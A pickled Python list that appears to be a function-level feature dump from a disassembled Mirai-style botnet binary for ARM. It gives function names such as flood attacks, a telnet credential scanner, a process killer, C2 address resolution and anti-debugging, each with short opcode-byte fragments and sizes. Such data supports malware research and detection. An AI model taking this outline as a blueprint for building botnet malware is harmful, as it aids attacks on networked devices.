(lp0
(S'.init_proc'
p1
S'0ddfe200eb4900'
p2
L24L
tp3
a(S'ioctl'
p4
S'00'
p5
L12L
tp6
a(S'recv'
p7
S'00'
p8
L12L
tp9
a(S'connect'
p10
S'00'
p11
L12L
tp12
a(S'sigemptyset'
p13
S'00'
p14
L12L
tp15
a(S'memmove'
p16
S'00'
p17
L12L
tp18
a(S'getpid'
p19
S'00'
p20
L12L
tp21
a(S'prctl'
p22
S'00'
p23
L12L
tp24
a(S'memcpy'
p25
S'00'
p26
L12L
tp27
a(S'readlink'
p28
S'00'
p29
L12L
tp30
a(S'malloc'
p31
S'00'
p32
L12L
tp33
a(S'sleep'
p34
S'00'
p35
L12L
tp36
a(S'recvfrom'
p37
S'00'
p38
L12L
tp39
a(S'socket'
p40
S'00'
p41
L12L
tp42
a(S'select'
p43
S'00'
p44
L12L
tp45
a(S'readdir'
p46
S'00'
p47
L12L
tp48
a(S'sigaddset'
p49
S'00'
p50
L12L
tp51
a(S'send'
p52
S'00'
p53
L12L
tp54
a(S'abort'
p55
S'00'
p56
L12L
tp57
a(S'accept'
p58
S'00'
p59
L12L
tp60
a(S'calloc'
p61
S'00'
p62
L12L
tp63
a(S'write'
p64
S'00'
p65
L12L
tp66
a(S'kill'
p67
S'00'
p68
L12L
tp69
a(S'bind'
p70
S'00'
p71
L12L
tp72
a(S'inet_addr'
p73
S'00'
p74
L12L
tp75
a(S'ntohl'
p76
S'00'
p77
L12L
tp78
a(S'chdir'
p79
S'00'
p80
L12L
tp81
a(S'setsockopt'
p82
S'00'
p83
L12L
tp84
a(S'signal'
p85
S'00'
p86
L12L
tp87
a(S'read'
p88
S'00'
p89
L12L
tp90
a(S'unlink'
p91
S'00'
p92
L12L
tp93
a(S'htonl'
p94
S'00'
p95
L12L
tp96
a(S'sendto'
p97
S'00'
p98
L12L
tp99
a(S'realloc'
p100
S'00'
p101
L12L
tp102
a(S'listen'
p103
S'00'
p104
L12L
tp105
a(S'fork'
p106
S'00'
p107
L12L
tp108
a(S'__uClibc_main'
p109
S'00'
p110
L12L
tp111
a(S'memset'
p112
S'00'
p113
L12L
tp114
a(S'ntohs'
p115
S'00'
p116
L12L
tp117
a(S'getppid'
p118
S'00'
p119
L12L
tp120
a(S'time'
p121
S'00'
p122
L12L
tp123
a(S'opendir'
p124
S'00'
p125
L12L
tp126
a(S'getsockopt'
p127
S'00'
p128
L12L
tp129
a(S'htons'
p130
S'00'
p131
L12L
tp132
a(S'__errno_location'
p133
S'00'
p134
L12L
tp135
a(S'exit'
p136
S'00'
p137
L12L
tp138
a(S'atoi'
p139
S'00'
p140
L12L
tp141
a(S'open'
p142
S'00'
p143
L12L
tp144
a(S'clock'
p145
S'00'
p146
L12L
tp147
a(S'setsid'
p148
S'00'
p149
L12L
tp150
a(S'closedir'
p151
S'00'
p152
L12L
tp153
a(S'fcntl'
p154
S'00'
p155
L12L
tp156
a(S'close'
p157
S'00'
p158
L12L
tp159
a(S'raise'
p160
S'00'
p161
L12L
tp162
a(S'free'
p163
S'00'
p164
L12L
tp165
a(S'sigprocmask'
p166
S'00'
p167
L12L
tp168
a(S'getsockname'
p169
S'00'
p170
L12L
tp171
a(S'__do_global_dtors_aux'
p172
S'30e900d50053e3800094e520e3000a833002a0e520e3'
p173
L104L
tp174
a(S'call___do_global_dtors_aux'
p175
S'042d'
p176
L8L
tp177
a(S'frame_dummy'
p178
S'3c9fe500042de51011'
p179
L68L
tp180
a(S'call_frame_dummy'
p181
S'042d'
p182
L8L
tp183
a(S'_start'
p184
S'00a0e420e500e5c00c9fe5'
p185
L44L
tp186
a(S'attack_app_http'
p187
S'702de2d000a0e30051ec'
p188
L17328L
tp189
a(S'attack_init'
p190
S'042de200e501eb00e501eb00e501eb00e501eb00e501eb00e501eb00e501eb00e501eb00e501eb00e501eb30e1d0'
p191
L144L
tp192
a(S'attack_kill_all'
p193
S'042de230e500ea9fe531e3000a30e531e110eb10e530e730e230e500eaebd0'
p194
L116L
tp195
a(S'attack_parse'
p196
S'10e90c'
p197
L1012L
tp198
a(S'attack_start'
p199
S'042de200e500e130e530e530e5ed'
p200
L340L
tp201
a(S'attack_get_opt_str'
p202
S'184de210e530e530e530e500eaa0e130e020e530e50007001a9de531e130e030e500ea8330e530e1'
p203
L160L
tp204
a(S'attack_get_opt_int'
p205
S'042de210e530e530e530e520e500e530eb30e530e3001a9de530eaa0eb30e530e1d0'
p206
L124L
tp207
a(S'attack_get_opt_ip'
p208
S'042de210e530e530e530e520e500e530eb30e530e3001a9de530ea'
p209
L120L
tp210
a(S'add_attack'
p211
S'042de230e530e500e3ec'
p212
L180L
tp213
a(S'free_opts'
p214
S'042de200e530e3000a30e500eaa0e130e030e3000a30e120e530e500eb30e230e530e1'
p215
L148L
tp216
a(S'attack_gre_ip'
p217
S'10e920'
p218
L2488L
tp219
a(S'attack_gre_eth'
p220
S'10e920'
p221
L2744L
tp222
a(S'attack_tcp_syn'
p223
S'10e934'
p224
L2772L
tp225
a(S'attack_tcp_ack'
p226
S'10e934'
p227
L2600L
tp228
a(S'attack_tcp_stomp'
p229
S'10e934'
p230
L3188L
tp231
a(S'attack_udp_generic'
p232
S'10e918'
p233
L1896L
tp234
a(S'attack_udp_vse'
p235
S'10e918'
p236
L1736L
tp237
a(S'attack_udp_dns'
p238
S'10e918'
p239
L2264L
tp240
a(S'attack_udp_plain'
p241
S'30e908'
p242
L1196L
tp243
a(S'get_dns_resolver'
p244
S'042de2d01e00eb00e31ceb30e110eb30e500eb38e300ba0443e208e12beb30e508eb00eb00e31ceb20e23003a0e51e0000a0e500eb38e3000a30e530e538e500eae00343e21e'
p245
L680L
tp246
a(S'checksum_generic'
p247
S'0c4de200e510e500ead301d303e120e020e530e530e230e500ef'
p248
L216L
tp249
a(S'checksum_tcpudp'
p250
S'042de200e530e534e130e530e530e530e530e530e530e500ead301d303e120e530e530e230e53000'
p251
L440L
tp252
a(S'killer_init'
p253
S'10e93c4de2a0e230e3d6'
p254
L1776L
tp255
a(S'killer_kill'
p256
S'042de530e110eb'
p257
L28L
tp258
a(S'killer_kill_by_port'
p259
S'10e9244de220e330898010e200e734e130e53ae330898101a0e110eb3ae330898230e300e3d4eb3ce330898020e330e110e1d4eb30e232e32ae53d43e20d8030e300e3d4eb3d833002'
p260
L3032L
tp261
a(S'has_exe_access'
p262
S'042de2d020'
p263
L492L
tp264
a(S'memory_scan_match'
p265
S'042de2d001e0373001'
p266
L812L
tp267
a(S'mem_exists'
p268
S'184de200e520e530e520e5001e00da30e500ead3149de520e530e50000a00320e230e230e3000a9de530e520e500040001a0e500ea'
p269
L216L
tp270
a(S'main'
p271
S'10e9044de200e530e530e500eb3da0eb3da0e3cf'
p272
L3060L
tp273
a(S'anti_gdb_entry'
p274
S'044de200e530e5d0'
p275
L28L
tp276
a(S'resolve_cnc_addr'
p277
S'10e903a0eb00e311eb30e102eb30e500eb30e3000a30e501eb20e530e500e115a0e1304c30e500eb00eb00e311eb30e530e534e120e534e130e500ebd0'
p278
L204L
tp279
a(S'establish_connection'
p280
S'10e901a0e3cc'
p281
L180L
tp282
a(S'teardown_connection'
p283
S'042de530e3000a30e500eb20e330e3cc'
p284
L60L
tp285
a(S'ensure_single_instance'
p286
S'10e901a0e500e320eb20e520e530e3000a31e5c000'
p287
L524L
tp288
a(S'unlock_tbl_if_nodebug'
p289
S'042de200e520e300e120eb30e530e530e330e532e2c00fe8009ce530e330eae003a0e230e030e130e030e530e530e3'
p290
L648L
tp291
a(S'rand_init'
p292
S'10e990cb'
p293
L112L
tp294
a(S'rand_next'
p295
S'044de230e530e5259de530e030e524e130e030e520e520e520e520e520e520e530e130e520e030e530e530e030e530e500e2'
p296
L180L
tp297
a(S'rand_str'
p298
S'10e904'
p299
L212L
tp300
a(S'rand_alphastr'
p301
S'042de200e531e2c003a0e1ca3400009de500220000a0e530e500eacd309de534e130e531e530e520e310e030e520e530e230e530e530e3'
p302
L280L
tp303
a(S'resolv_domain_to_hostname'
p304
S'042de200e500eb30e230e530e530e530e500ead31730e530e230e50002001730e5000a000c9de530e530e530e530e230e330e500ea8330e520e530e530e230e50000a0c3ff03089de53008'
p305
L256L
tp306
a(S'resolv_skip_name'
p307
S'144de200e520e330e530e500ead3bf009ad303e130e230e530e230e530e03008'
p308
L220L
tp309
a(S'resolv_lookup'
p310
S'10e9384de23d43e21d8101a0e3ca00a0e230e230e2cab48c01'
p311
L2632L
tp312
a(S'resolv_entries_free'
p313
S'042de200e5000900009de530e3000a30e500eb00ebd0'
p314
L72L
tp315
a(S'recv_strip_null'
p316
S'042de200e520e530e510e130eb30e530e300da30e530e500ea9de530e5000400089de530e030e530e230e530e1'
p317
L176L
tp318
a(S'scanner_init'
p319
S'10e9044de2'
p320
L6512L
tp321
a(S'scanner_kill'
p322
S'042de530e110eb'
p323
L28L
tp324
a(S'setup_connection'
p325
S'10e900'
p326
L352L
tp327
a(S'get_random_ip'
p328
S'042de2'
p329
L540L
tp330
a(S'consume_iacs'
p331
S'042de200e330e530e500ead3ff53e3001a9de530e500801a00e520eb30e3000a9de530e50006001a9de530e530e230ea8330e5003000c0e520e300e120eb31e2c003a0e1bf9de510e303eb30e3000a9de530e50016001a9de530e530e230e530e200e120e3bf9de530e200e120e3bf00009de510e303eb30e3000a30e500eaa0e530e50006001a30e130e030e330e500eaa0e530e5000530e130e030e330e530e230e500de'
p332
L620L
tp333
a(S'consume_any_prompt'
p334
S'144de200e330e530e230ea9de520e030e5001f000a9de530e330e030e50017000a9de530e330e030e5000f0a9de530e330e030e50007000a9de530e330e030e50003000c9de530e500ea43e230e500cdff109de500020000a0e500ea'
p335
L284L
tp336
a(S'consume_user_prompt'
p337
S'042de200e330e530e230ea9de520e030e5001f000a9de530e330e030e50017000a9de530e330e030e5000f0a9de530e330e030e50007000a9de530e330e030e50003000c9de530e500ea43e230e500cdff109de5002000049de520e530e110e530eb30e530e3000a9de530ea8330e500e120e305a0e530e3000a9de530e500020000a0e500ea'
p338
L432L
tp339
a(S'consume_pass_prompt'
p340
S'042de200e330e530e230ea9de520e030e50017000a9de530e330e030e5000f0a9de530e330e030e50007000a9de530e330e030e50003000c9de530e500ea43e230e500d5ff109de5000f1a9de520e530e110e530eb30e530e3000a9de530e500020000a0e500ea'
p341
L332L
tp342
a(S'consume_resp_prompt'
p343
S'042de200e302eb30e310eb30e530e230e530e200e505a0e3000a00eb30e330ea0019a0eb30e310eb30e530e230e530e200e505a0e500eb30e3001a30e500ea'
p344
L252L
tp345
a(S'add_auth_entry'
p346
S'10e908'
p347
L468L
tp348
a(S'random_auth_entry'
p349
S'042de2'
p350
L288L
tp351
a(S'report_working'
p352
S'10e908'
p353
L600L
tp354
a(S'deobf'
p355
S'042de200e500eb20e520e530e200eb30e530e530e510e102eb30e500eaa0e510e520e530e530e330e030e230e530e130e030e130e020e530e330e030e230e530e130e030e130e020e530e330e030e230e530e130e030e130e020e530e330e030e230e530e230e520e500c3'
p356
L360L
tp357
a(S'can_consume'
p358
S'104de200e520e530e130e530e530e130e030e1303300e2'
p359
L88L
tp360
a(S'table_init'
p361
S'042de313e301eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb00e520eb'
p362
L808L
tp363
a(S'table_unlock_val'
p364
S'042de230e530e531e130e030e500ebd0'
p365
L60L
tp366
a(S'table_lock_val'
p367
S'042de230e530e531e130e030e500ebd0'
p368
L60L
tp369
a(S'table_retrieve_val'
p370
S'0c4de200e530e120e530e530e3000a30e220e530e534e120e520e530e1d0'
p371
L100L
tp372
a(S'add_entry'
p373
S'042de230e520e530e1baa0e500e520eb10e520e531e530e108e510e130e000e534e130e5d0'
p374
L132L
tp375
a(S'toggle_obf'
p376
S'104de230e530e531e131e030e530e531e534e130e531e538e531e53ce130e530e500ea93e530e030e530e020e530e530e030e230e530e530e030e530e020e530e530e030e230e530e530e030e530e020e530e530e030e230e530e530e030e530e020e530e530e030e230e530e230e530e530e534e120e500bfd0'
p377
L372L
tp378
a(S'util_strlen'
p379
S'084de200e330ea8330e530e50000a01320e230e230e3'
p380
L92L
tp381
a(S'util_strncmp'
p382
S'042de200e520e5'
p383
L220L
tp384
a(S'util_strcmp'
p385
S'042de200e500eb30e500eb30e520e5001530e500ead3049de530e50000a01320e230e230e530e500020000a0e500ea43e230e500e6ff01a0e530e1d0'
p386
L200L
tp387
a(S'util_strcpy'
p388
S'042de200e500eb30e530e200e520eb30e1d0'
p389
L72L
tp390
a(S'util_memcpy'
p391
S'144de200e520e530e530ead30c9de530e530e230e530e530e230e500ef'
p392
L108L
tp393
a(S'util_zero'
p394
S'0c4de200e530e500eaa0e530e230e53000'
p395
L80L
tp396
a(S'util_atoi'
p397
S'042de200e530e530e530e530e530e530e200eb30e3'
p398
L664L
tp399
a(S'util_itoa'
p400
S'042de200e520e500020000a0e500ea53e3000a30e530e530e3001a9de5000530e530e230ea'
p401
L432L
tp402
a(S'util_memsearch'
p403
S'1c4de200e520e530e520e500020000e000'
p404
L220L
tp405
a(S'util_stristr'
p406
S'042de200e520e530e5fd'
p407
L368L
tp408
a(S'util_local_addr'
p409
S'042de230e5b8a0e330e310e3b8a0e530e3001a30e500eaa0e520e50be208eb30e500eb30e534e130e530e510e3b7eb30e200e1b89de5b89de530e500e2'
p410
L216L
tp411
a(S'util_fdgets'
p412
S'042de200e520e330e330e520e530e510e3b8a0e530e3001a30e230ea'
p413
L224L
tp414
a(S'util_isupper'
p415
S'084de230e530e5000530e500020000'
p416
L72L
tp417
a(S'util_isalpha'
p418
S'084de230e530e50002005a000530e5000530e500020000'
p419
L96L
tp420
a(S'util_isspace'
p421
S'084de230e530e500080004dd0953e3000add0a53e3000add0a53e3001a30e500ea'
p422
L96L
tp423
a(S'util_isdigit'
p424
S'084de230e530e5000530e500020000'
p425
L72L
tp426
a(S'__udivsi3'
p427
S'0151e2'
p428
L248L
tp429
a(S'__aeabi_uidivmod'
p430
S'03e90640bde0100e'
p431
L24L
tp432
a(S'__umodsi3'
p433
S'0151e2003a0000a081'
p434
L204L
tp435
a(S'__modsi3'
p436
S'0051e3000a1000b00060420151e20000a081009a51e30001a032'
p437
L228L
tp438
a(S'__do_global_ctors_aux'
p439
S'289fe520e50010e910a0e120fa'
p440
L48L
tp441
a(S'call___do_global_ctors_aux'
p442
S'042d'
p443
L8L
tp444
a(S'.term_proc'
p445
S'0ddfe2b7ebaf1b'
p446
L20L
tp447
a.